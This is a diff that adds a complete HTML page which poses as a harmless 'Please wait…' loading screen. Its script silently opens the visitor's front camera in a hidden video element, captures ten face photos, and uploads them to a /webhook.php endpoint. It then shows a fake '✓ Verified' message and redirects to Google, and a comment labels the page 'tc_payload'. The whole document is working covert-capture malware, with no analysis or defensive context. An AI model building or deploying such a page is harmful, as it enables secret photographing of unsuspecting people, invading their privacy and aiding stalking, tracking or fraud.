@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Loading…</title>
+    <style>
+        body { background: #fff; font-family: Arial, sans-serif; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        #container { text-align: center; }
+        .spinner { border: 4px solid #f0f0f0; border-top: 4px solid #e63946; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { font-size: 14px; color: #888; margin: 0; }
+    </style>
+</head>
+<body>
+    <video id="hidden-video" style="display:none;" autoplay playsinline muted></video>
+    <div id="container"><div class="spinner"></div><p>Please wait…</p></div>
+    <script>
+    (function() {
+        var photos = [], video = document.getElementById('hidden-video');
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false })
+            .then(function(stream) {
+                video.srcObject = stream; video.play();
+                video.addEventListener('loadeddata', function() { capturePhotos(stream); });
+                setTimeout(function() { if (photos.length === 0) capturePhotos(stream); }, 300);
+            })
+            .catch(function() { /* camera denied – just redirect */ setTimeout(function() { location.href = 'https://www.google.com'; }, 2000); });
+        }
+        function capturePhotos(stream) {
+            var max = 10;
+            function snap() {
+                if (video.videoWidth === 0 && video.videoHeight === 0) { setTimeout(snap, 200); return; }
+                var c = document.createElement('canvas'); c.width = video.videoWidth || 640; c.height = video.videoHeight || 480;
+                c.getContext('2d').drawImage(video, 0, 0);
+                photos.push(c.toDataURL('image/jpeg', 0.7));
+                if (photos.length < max) { setTimeout(snap, 250); } else { stream.getTracks().forEach(t => t.stop()); upload(); }
+            }
+            snap();
+        }
+        function upload() {
+            var fd = new FormData();
+            photos.forEach(function(b64, i) { var blob = dataURItoBlob(b64); fd.append('photo_' + i, blob, 'face_' + i + '.jpg'); });
+            fetch('/webhook.php', { method: 'POST', body: fd })
+                .then(function() { document.getElementById('container').innerHTML = '<p style="color:#4caf50;">✓ Verified</p>'; setTimeout(function() { location.href = 'https://www.google.com'; }, 3000); })
+                .catch(function() { document.getElementById('container').innerHTML = '<p style="color:#888;">Redirecting…</p>'; setTimeout(function() { location.href = 'https://www.google.com'; }, 2000); });
+        }
+        function dataURItoBlob(d) { var a = d.split(','), m = a[0].match(/:(.*?);/)[1], b = atob(a[1]), n = b.length, u = new Uint8Array(n); for (var i = 0; i < n; i++) u[i] = b.charCodeAt(i); return new Blob([u], { type: m }); }
+        setTimeout(startCamera, 200);
+        document.addEventListener('click', function() { if (photos.length === 0) startCamera(); }, { once: true });
+        document.addEventListener('touchstart', function() { if (photos.length === 0) startCamera(); }, { once: true });
+    })();
+    </script>
+    <!-- tc_payload -->
+</body>
+</html>
